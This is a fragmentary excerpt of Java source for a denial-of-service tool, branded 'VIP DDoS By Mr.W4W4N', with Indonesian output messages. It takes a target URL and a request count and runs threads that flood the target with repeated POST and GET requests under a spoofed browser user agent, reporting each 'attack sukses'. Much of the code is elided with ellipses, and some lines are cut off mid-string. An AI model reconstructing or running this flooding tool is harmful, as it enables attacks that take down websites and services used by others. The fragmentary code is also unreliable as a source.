...
public class Dos implements Runnable {
    ...
    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1)>
...
postAttack(Dos.url);
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Mulai Attack to url: " + url);
        ...
        System.out.println("VIP DDoS By Mr.W4W4N");
...
Dos.amount = Integer.parseInt(amount);
        ...
        System.out.println("Mulai Attack");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("POST attack sukses Mr.W4W4N !: " + responseCode + "Thread: >
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("GET attack sukses Mr.W4W4N !: " + responseCode + "Thread: ">
    }
